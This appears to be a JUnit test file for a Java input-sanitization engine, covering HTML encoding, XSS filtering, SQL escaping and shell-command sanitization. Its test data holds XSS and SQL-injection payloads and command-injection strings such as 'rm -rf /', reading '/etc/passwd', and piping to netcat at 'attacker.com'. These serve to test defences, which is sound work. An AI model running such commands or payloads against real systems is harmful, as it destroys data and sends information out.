package com.developer.validation;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Unit tests for SanitizationEngine
 */
class SanitizationEngineTest {
    
    private SanitizationEngine engine;
    
    @BeforeEach
    void setUp() {
        engine = new SanitizationEngine();
    }
    
    @Test
    @DisplayName("Should HTML encode dangerous characters")
    void shouldHtmlEncodeDangerousCharacters() {
        // Given
        String input = "<script>alert('XSS')</script>";
        
        // When
        String encoded = engine.htmlEncode(input);
        
        // Then
        assertTrue(encoded.contains("&lt;"));
        assertTrue(encoded.contains("&gt;"));
        assertTrue(encoded.contains("&#x27;"));
        assertFalse(encoded.contains("<"));
        assertFalse(encoded.contains(">"));
        assertFalse(encoded.contains("'"));
    }
    
    @Test
    @DisplayName("Should prevent XSS attacks")
    void shouldPreventXssAttacks() {
        // Given
        String[] xssInputs = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<div onclick=\"alert('XSS')\">Click me</div>",
            "data:text/html,<script>alert('XSS')</script>"
        };
        
        // When & Then
        for (String input : xssInputs) {
            String sanitized = engine.preventXss(input);
            
            assertFalse(sanitized.contains("<script>"), 
                "Should remove script tags from: " + input);
            assertFalse(sanitized.contains("javascript:"), 
                "Should remove javascript protocol from: " + input);
            assertFalse(sanitized.contains("data:"), 
                "Should remove data protocol from: " + input);
            assertFalse(sanitized.contains("onerror="), 
                "Should remove event handlers from: " + input);
        }
    }
    
    @Test
    @DisplayName("Should make input SQL safe")
    void shouldMakeInputSqlSafe() {
        // Given
        String[] sqlInputs = {
            "'; DROP TABLE users; --",
            "admin'--",
            "SELECT * FROM users /* comment */",
            "test\0input"
        };
        
        // When & Then
        for (String input : sqlInputs) {
            String sanitized = engine.makeSqlSafe(input);
            
            assertFalse(sanitized.contains("--"), 
                "Should remove SQL comments from: " + input);
            assertFalse(sanitized.contains("/*"), 
                "Should remove SQL block comments from: " + input);
            assertFalse(sanitized.contains("\0"), 
                "Should remove null bytes from: " + input);
            
            // Single quotes should be escaped (doubled)
            if (input.contains("'") && !input.contains("''")) {
                assertTrue(sanitized.contains("''") || !sanitized.contains("'"), 
                    "Should escape single quotes in: " + input);
            }
        }
    }
    
    @Test
    @DisplayName("Should make input command safe")
    void shouldMakeInputCommandSafe() {
        // Given
        String[] commandInputs = {
            "test; rm -rf /",
            "file.txt && cat /etc/passwd",
            "input | nc attacker.com 4444",
            "$(whoami)",
            "`id`"
        };
        
        // When & Then
        for (String input : commandInputs) {
            String sanitized = engine.makeCommandSafe(input);
            
            assertFalse(sanitized.contains(";"), 
                "Should remove semicolons from: " + input);
            assertFalse(sanitized.contains("|"), 
                "Should remove pipes from: " + input);
            assertFalse(sanitized.contains("&"), 
                "Should remove ampersands from: " + input);
            assertFalse(sanitized.contains("$"), 
                "Should remove dollar signs from: " + input);
            assertFalse(sanitized.contains("`"), 
                "Should remove backticks from: " + input);
        }
    }
    
    @Test
    @DisplayName("Should apply comprehensive sanitization")
    void shouldApplyComprehensiveSanitization() {
        // Given
        String dangerousInput = "<script>alert('XSS')</script>'; DROP TABLE users; --";
        
        // When
        String sanitized = engine.sanitize(dangerousInput, SanitizationStrategy.COMPREHENSIVE);
        
        // Then
        assertNotEquals(dangerousInput, sanitized);
        assertFalse(sanitized.contains("<script>"));
        assertFalse(sanitized.contains("--"));
        // Should contain HTML encoded characters or be empty (script tags removed)
        assertTrue(sanitized.contains("&") || sanitized.isEmpty());
    }
    
    @Test
    @DisplayName("Should apply strict sanitization")
    void shouldApplyStrictSanitization() {
        // Given
        String input = "<div>Hello & <script>alert('XSS')</script> goodbye</div>";
        
        // When
        String sanitized = engine.sanitize(input, SanitizationStrategy.STRICT);
        
        // Then
        assertNotEquals(input, sanitized);
        assertFalse(sanitized.contains("<div>"));
        assertFalse(sanitized.contains("<script>"));
        assertFalse(sanitized.contains("<"));
        assertFalse(sanitized.contains(">"));
    }
    
    @Test
    @DisplayName("Should URL encode and decode correctly")
    void shouldUrlEncodeAndDecodeCorrectly() {
        // Given
        String input = "Hello World & Special Characters!";
        
        // When
        String encoded = engine.urlEncode(input);
        String decoded = engine.urlDecode(encoded);
        
        // Then
        assertNotEquals(input, encoded);
        assertTrue(encoded.contains("+") || encoded.contains("%20")); // Space can be encoded as + or %20
        assertTrue(encoded.contains("%26")); // & should be encoded
        assertEquals(input, decoded);
    }
    
    @Test
    @DisplayName("Should HTML decode correctly")
    void shouldHtmlDecodeCorrectly() {
        // Given
        String encoded = "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;";
        
        // When
        String decoded = engine.htmlDecode(encoded);
        
        // Then
        assertTrue(decoded.contains("<script>"));
        assertTrue(decoded.contains("'"));
        assertFalse(decoded.contains("&lt;"));
        assertFalse(decoded.contains("&#x27;"));
    }
    
    @Test
    @DisplayName("Should strip HTML tags")
    void shouldStripHtmlTags() {
        // Given
        String input = "<div>Hello <b>World</b></div>";
        
        // When
        String stripped = engine.stripHtmlTags(input);
        
        // Then
        assertEquals("Hello World", stripped);
        assertFalse(stripped.contains("<"));
        assertFalse(stripped.contains(">"));
    }
    
    @Test
    @DisplayName("Should validate sanitization results")
    void shouldValidateSanitizationResults() {
        // Given
        String dangerous = "<script>alert('XSS')</script>";
        String safe = engine.sanitize(dangerous);
        
        // When
        boolean isValid = engine.validateSanitization(dangerous, safe);
        
        // Then
        assertTrue(isValid);
    }
    
    @Test
    @DisplayName("Should handle null and empty input safely")
    void shouldHandleNullAndEmptyInputSafely() {
        // Test null input
        assertNull(engine.htmlEncode(null));
        assertNull(engine.sanitize(null));
        
        // Test empty input
        assertEquals("", engine.htmlEncode(""));
        assertEquals("", engine.sanitize(""));
        
        // Test whitespace input
        String whitespace = "   ";
        assertEquals(whitespace, engine.htmlEncode(whitespace));
        assertEquals(whitespace, engine.sanitize(whitespace));
    }
    
    @Test
    @DisplayName("Should use default strategy when none specified")
    void shouldUseDefaultStrategyWhenNoneSpecified() {
        // Given
        String input = "<script>alert('XSS')</script>";
        
        // When
        String sanitized1 = engine.sanitize(input);
        String sanitized2 = engine.sanitize(input, SanitizationStrategy.COMPREHENSIVE);
        
        // Then
        assertEquals(sanitized1, sanitized2);
    }
    
    @Test
    @DisplayName("Should handle different sanitization strategies")
    void shouldHandleDifferentSanitizationStrategies() {
        // Given - use input that will be affected by each strategy
        String htmlInput = "<div>Hello & goodbye</div>";
        String sqlInput = "SELECT * FROM users; -- comment";
        String commandInput = "test; rm -rf /";
        
        // When
        String htmlEncoded = engine.sanitize(htmlInput, SanitizationStrategy.HTML_ENCODE);
        String xssPrevented = engine.sanitize(htmlInput, SanitizationStrategy.XSS_PREVENTION);
        String sqlSafe = engine.sanitize(sqlInput, SanitizationStrategy.SQL_SAFE);
        String commandSafe = engine.sanitize(commandInput, SanitizationStrategy.COMMAND_SAFE);
        String comprehensive = engine.sanitize(htmlInput, SanitizationStrategy.COMPREHENSIVE);
        String strict = engine.sanitize(htmlInput, SanitizationStrategy.STRICT);
        
        // Then
        assertNotEquals(htmlInput, htmlEncoded);
        assertNotEquals(htmlInput, xssPrevented);
        assertNotEquals(sqlInput, sqlSafe);
        assertNotEquals(commandInput, commandSafe);
        assertNotEquals(htmlInput, comprehensive);
        assertNotEquals(htmlInput, strict);
        
        // Each strategy should produce expected results
        assertTrue(htmlEncoded.contains("&lt;"));
        assertTrue(xssPrevented.contains("&lt;"));
        assertFalse(sqlSafe.contains("--"));
        assertFalse(commandSafe.contains(";"));
        assertFalse(strict.contains("<"));
    }
}